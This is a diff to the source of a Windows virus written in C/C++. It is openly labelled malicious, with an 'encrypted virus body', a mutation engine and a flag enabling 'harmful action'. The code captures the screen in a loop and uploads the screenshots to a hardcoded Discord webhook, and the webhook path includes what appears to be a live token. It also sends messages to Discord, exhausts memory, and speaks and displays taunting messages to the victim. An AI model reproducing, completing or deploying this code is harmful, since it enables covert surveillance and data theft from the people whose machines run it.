@@ -1,6 +1,20 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <windows.h>
+#include <mmsystem.h>
+#include <time.h>
+#include <tlhelp32.h>
+#include <tchar.h>
+#include <sapi.h>
+#include <wininet.h>
+#include <gdiplus.h>
+#include <shlobj.h>
+#pragma comment(lib, "wininet.lib")
+#pragma comment (lib, "gdiplus.lib")
+#pragma comment (lib, "wininet.lib")
+#pragma comment (lib, "ole32.lib") // Added for CoInitialize, CoCreateInstance
+#pragma comment (lib, "shell32.lib") // Added for ShellExecute
 
 // Encrypted virus body
 unsigned char encrypted_virus_body[] = {
@@ -20,33 +34,12 @@ void decrypt(unsigned char *data, size_t length, unsigned char key) {
 
 // Mutation engine (simple example)
 unsigned char generate_new_key() {
+    srand(time(NULL)); // Seed the random number generator
     return rand() % 256;
 }
 
-// Main virus function
-void virus_body() {
-    printf("Hello from the virus body!\n");
-    //  malicious code here
-    #include <windows.h>
-#include <mmsystem.h>
-#include <stdlib.h>
-#include <time.h>
-#include <stdio.h>
-#include <tlhelp32.h>
-#include <tchar.h>
-#include <sapi.h>
-#include <string.h>
-#include <wininet.h>
-#pragma comment(lib, "wininet.lib")
-#include <gdiplus.h>
-#include <shlobj.h>
-#pragma comment (lib, "gdiplus.lib")
-#pragma comment (lib, "wininet.lib")
-#pragma comment (lib, "ole32.lib") // Added for CoInitialize, CoCreateInstance
-#pragma comment (lib, "shell32.lib") // Added for ShellExecute
-
 // Global flag to control malicious behavior
-BOOL g_bEnableMaliciousBehavior = true; // Set to FALSE to disable harmful actions and set to true for harmfull action as i did  
+BOOL g_bEnableMaliciousBehavior = true; // Set to FALSE to disable harmful actions and set to true for harmful action as i did
 
 // Forward declarations for memory management
 void FreeMarkovChain();
@@ -54,13 +47,12 @@ void FreeMarkovChain();
 BOOL CaptureScreenToFile(const wchar_t* filename) {
     HDC hScreenDC = GetDC(NULL);
     if (!hScreenDC) return FALSE;
-    
+
     HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
     if (!hMemoryDC) {
         ReleaseDC(NULL, hScreenDC);
         return FALSE;
     }
-    
 
     int width = GetSystemMetrics(SM_CXSCREEN);
     int height = GetSystemMetrics(SM_CYSCREEN);
@@ -111,6 +103,7 @@ BOOL CaptureScreenToFile(const wchar_t* filename) {
     ReleaseDC(NULL, hScreenDC);
     return TRUE;
 }
+
 void UploadScreenshotToDiscord(const char* webhook, const wchar_t* filename) {
     if (!g_bEnableMaliciousBehavior) return; // Disable if malicious behavior is off
 
@@ -130,14 +123,14 @@ void UploadScreenshotToDiscord(const char* webhook, const wchar_t* filename) {
         fclose(f);
         return;
     }
-        
+
     if (fread(data, 1, len, f) != len) {
         free(data);
         fclose(f);
         return;
     }
     fclose(f);
-    
+
     HINTERNET hInternet = InternetOpen("PayloadBot", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if (!hInternet) {
         free(data);
@@ -174,11 +167,10 @@ void UploadScreenshotToDiscord(const char* webhook, const wchar_t* filename) {
         InternetCloseHandle(hInternet);
         return;
     }
-        
+
     memcpy(postData, preamble, strlen(preamble));
     memcpy(postData + strlen(preamble), data, len);
     memcpy(postData + strlen(preamble) + len, epilogue, strlen(epilogue));
-   
 
     HINTERNET hRequest = HttpOpenRequest(hConnect, "POST",
         "/api/webhooks/1392479261645996184/ymFVyUJQ33lkAF2fFylOGD0PjXq_RjQY-ZlhXJ031f17tp-xxW6UGLTbxJOktqTrMZHg", // Placeholder for webhook
@@ -194,6 +186,7 @@ void UploadScreenshotToDiscord(const char* webhook, const wchar_t* filename) {
     InternetCloseHandle(hConnect);
     InternetCloseHandle(hInternet);
 }
+
 DWORD WINAPI ScreenshotLoop(LPVOID lpParam) {
     while (1) {
         if (!g_bEnableMaliciousBehavior) { // Disable if malicious behavior is off
@@ -205,13 +198,13 @@ DWORD WINAPI ScreenshotLoop(LPVOID lpParam) {
         // Use GetTempPath and GetTempFileName for more robust temporary file creation
         if (GetTempPathW(MAX_PATH, path) == 0) {
             // Handle error, fallback or return
-            Sleep(30000); 
+            Sleep(30000);
             continue;
         }
         wchar_t tempFileName[MAX_PATH];
         if (GetTempFileNameW(path, L"scr", 0, tempFileName) == 0) {
             // Handle error, fallback or return
-            Sleep(30000); 
+            Sleep(30000);
             continue;
         }
         wcscat(tempFileName, L".jpg"); // Append .jpg extension
@@ -225,16 +218,13 @@ DWORD WINAPI ScreenshotLoop(LPVOID lpParam) {
     }
 }
 
-
 void SendToDiscord(const char* webhookUrl, const char* message) {
     if (!g_bEnableMaliciousBehavior) return; // Disable if malicious behavior is off
 
     if (!webhookUrl || !message) return;
-    
+
     HINTERNET hInternet = InternetOpen("DiscordBot", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if (!hInternet) return;
-
-    // Removed unnecessary InternetOpenUrl
 
     HINTERNET hConnect = InternetConnect(hInternet, "discord.com", INTERNET_DEFAULT_HTTPS_PORT,
                                NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
@@ -270,8 +260,6 @@ void SendToDiscord(const char* webhookUrl, const char* message) {
     InternetCloseHandle(hConnect);
     InternetCloseHandle(hInternet);
 }
-
-
 
 #define MAX_WORDS 1000
 #define MAX_CHAIN_LEN 200 // Not used, but kept as per instruction
@@ -328,7 +316,7 @@ void AddToChain(const char* current, const char* next) {
 
 void InitMarkov() {
     // Free previously allocated memory if InitMarkov is called multiple times
-    FreeMarkovChain(); 
+    FreeMarkovChain();
 
     for (int i = 0; i < word_count - 1; i++) {
         AddToChain(words[i], words[i+1]);
@@ -361,7 +349,6 @@ void GenerateLyrics(WCHAR* outLyrics, int maxWords) {
     // FreeMarkovChain(); // Free memory after generating lyrics - moved to InitMarkov
 }
 
-
 void SpeakLyrics(LPCWSTR text) {
     ISpVoice* pVoice = NULL;
     HRESULT hr = ::CoInitialize(NULL);
@@ -374,6 +361,7 @@ void SpeakLyrics(LPCWSTR text) {
     }
     CoUninitialize();
 }
+
 DWORD WINAPI AutoSing(LPVOID lpParam) {
     while (1) {
         if (!g_bEnableMaliciousBehavior) { // Disable if malicious behavior is off
@@ -381,7 +369,7 @@ DWORD WINAPI AutoSing(LPVOID lpParam) {
             continue;
         }
 
-        //send to Discord 
+        //send to Discord
         WCHAR lyrics[2048];
         GenerateLyrics(lyrics, 15);
         SpeakLyrics(lyrics);
@@ -391,7 +379,6 @@ DWORD WINAPI AutoSing(LPVOID lpParam) {
 
     }
 }
-
 
 #pragma comment(lib, "winmm.lib")
 
@@ -441,7 +428,7 @@ DWORD WINAPI EatRAM(LPVOID lpParam) {
         void* mem = malloc(1024 * 1024 * 100); // 100MB
         if (!mem) break;
         memset(mem, 0, 1024 * 1024 * 100);
-        // Free the allocated memory to prevent RAM exhaustion
+                // Free the allocated memory to prevent RAM exhaustion
         free(mem);
         Sleep(1000);
     }
@@ -570,20 +557,16 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 
     SpeakLyrics(L"You are an idiot. You are an idiot. Ha ha ha ha haaaa.");
 
-WCHAR lyrics[2048];
-GenerateLyrics(lyrics, 15);  // Generate 15-word lyrics
-SpeakLyrics(lyrics); // Speaks it loud
+    WCHAR lyrics[2048];
+    GenerateLyrics(lyrics, 15);  // Generate 15-word lyrics
+    SpeakLyrics(lyrics); // Speaks it loud
 
-    
-CreateThread(NULL, 0, AutoSing, NULL, 0, NULL);
-CreateThread(NULL, 0, ScreenshotLoop, NULL, 0, NULL);
+    CreateThread(NULL, 0, AutoSing, NULL, 0, NULL);
+    CreateThread(NULL, 0, ScreenshotLoop, NULL, 0, NULL);
 
-Gdiplus::GdiplusStartupInput gdiplusStartupInput;
-ULONG_PTR gdiplusToken;
-Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
-
-
-
+    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
+    ULONG_PTR gdiplusToken;
+    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
 
     // Just for that extra "wtf" moment
     MessageBox(NULL, TEXT("You are an idiot."), TEXT("created_by_ShadowRoot17"), MB_OK | MB_ICONERROR);
@@ -645,9 +628,6 @@ Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
     Gdiplus::GdiplusShutdown(gdiplusToken);
 
     return 0;
-}
-
-
 }
 
 int main() {
